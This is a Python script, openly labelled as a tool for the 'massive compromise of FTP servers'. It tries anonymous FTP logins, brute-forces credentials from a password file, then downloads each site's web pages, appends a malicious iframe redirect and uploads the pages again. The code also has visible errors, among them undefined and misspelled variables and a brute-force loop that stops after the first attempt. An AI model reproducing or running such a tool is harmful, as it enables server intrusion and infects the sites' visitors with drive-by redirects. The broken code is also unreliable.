#!/usr/bin/env python

import argparse
import ftplib
import time


def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login("anonymous", "me@your.com")

        print(f"[+] {str(hostname)} FTP anonymous logon succeed")

        ftp.quit()

        return True
    except Exception as err:
        print(f"[-] {str(hostname)} FTP anonymous logon failed")

        return False


def brute_login(hostname, passwd_file):
    pf = open(passwd_file, 'r')
    for line in pf.readlines():
        time.sleep(1)

        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')

        print(f"[*] Trying: {username}/{passwd}")

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, passwd)

            print(f"[*] {str(hostname)} FTP logon succeed: {username}/{passwd}")

            ftp.quit()

            return (username, passwd)
        except Exception as err:
            pass

        print(f"[-] Could not brute force FTP credentials")

        return (None, None)

def return_default(ftp):
    try:
        dir_list = ftp.nlst()
    except:
        dir_list = []

        print(f"[-] Could not list directory contents")
        print(f"[*] Skipping to the next target")

        return

    ret_list = []
    for filename in dir_list:
        fn = filename.lower()
        if ".php" in fn or ".htm" in fn or ".asp" in fn:
            print(f"[+] Found default page: {filename}")

        ret_list.append(filename)

    return ret_list


def inject_page(ftp, page, redirect):
    f = open(page + ".tmp", 'w')
    ftp.retrlines("RETR " + page, f.write)

    print(f"[+] Downloaded page: {page}")

    f.write(redirect)
    f.close()

    print(f"[+] Injected malicious IFrame on {page}")

    ftp.storlines("STOR " + page, open(page + ".tmp"))

    print(f"[+] Uploaded injected page {page}")


def attack(username, password, target_host, redirect):
    ftp = ftplib.FTP(target_host)
    ftp.login(username, password)

    def_ages = return_default(ftp)

    for def_page in def_pages:
        inject_page(ftp, def_page, redirect)


def main():
    parser = argparse.ArgumentParser(description="massive compromise of FTP servers")
    parser.add_argument("-H", dest="target_hosts", type=str, help="specify target host(s)")
    parser.add_argument("-f", dest="passwd_file", type=str, help="specify user/password file")
    parser.add_argument("-r", dest="redirect", type=str, help="specify a redirection page")

    args = parser.parse_args()

    target_hosts = str(args.target_hosts).split(', ')
    passwd_file = args.passwd_file
    redirect = args.redirect

    if not target_hosts or not redirect:
        print(parser.usage)

        exit(0)

    for target_host in target_hosts:
        username = None
        password = None

        if anon_login(target_host):
            username = "anonymous"
            password = "my@your.com"

            print(f"[+] Using anonymous credentials to attack")

            attack(username, password, target_host, redirect)
        elif passwd_file:
            (username, password) = brute_login(target_host, passwd_file)

        if password:
            print(f"[+] Using credentials {username}/{password} to attack")

            attack(username, password, target_host, redirect)


if __name__ == '__main__':
    main()
